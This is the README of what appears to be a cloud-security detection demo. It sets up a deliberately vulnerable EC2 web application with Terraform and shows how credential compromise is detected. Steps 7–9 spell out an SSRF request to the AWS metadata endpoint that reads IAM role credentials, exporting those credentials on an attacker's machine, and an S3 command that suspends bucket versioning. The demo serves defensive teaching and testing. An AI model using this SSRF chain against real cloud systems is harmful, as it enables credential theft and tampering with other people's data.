# Demo for the detection of role credential compromise

## Introduction
In this demo, we will exploit a Server Side Request Forgery (SSRF) vulnerability
in a web application to extract the credentials of the EC2 instance where the 
application is running. The application will inadvertently contact the AWS 
metadata service to extract the credentials.

## Requirements
To run this demo, we need the following:
1. An AWS account onboarded to a Prisma Cloud stack
2. A user account (or IDP account) with enough permissions to do operations
such as running instances, creating roles and policies and passing roles
3. Terraform installed locally. Here are the steps for Mac:
```
 brew update
 brew tap hashicorp/tap
 brew install hashicorp/tap/terraform
```

## Steps to create the demo scenario
1. Go to the `terraform` directory 
2. Open the file ``variables.tf``
3. Change the value for all variables
4. run ``terraform init``
5. run ``terraform plan``. Make sure there are no errors at the end
6. run ``terraform apply``. Make sure there are no errors at the end
7. Go to http://<ec2_ip_address>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ec2_role>

## Steps to complete the demo
8. Copy the `AccessKeyId`, `SecretAccessKey` and `Token` into environment 
variables in the attacker's machine:
```shell
export AWS_ACCESS_KEY_ID=...
export export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```
9. Run a command from the attacker's machine. For example:
```shell
aws s3api put-bucket-versioning --bucket <bucket_name> --versioning-configuration Status=Suspended
```
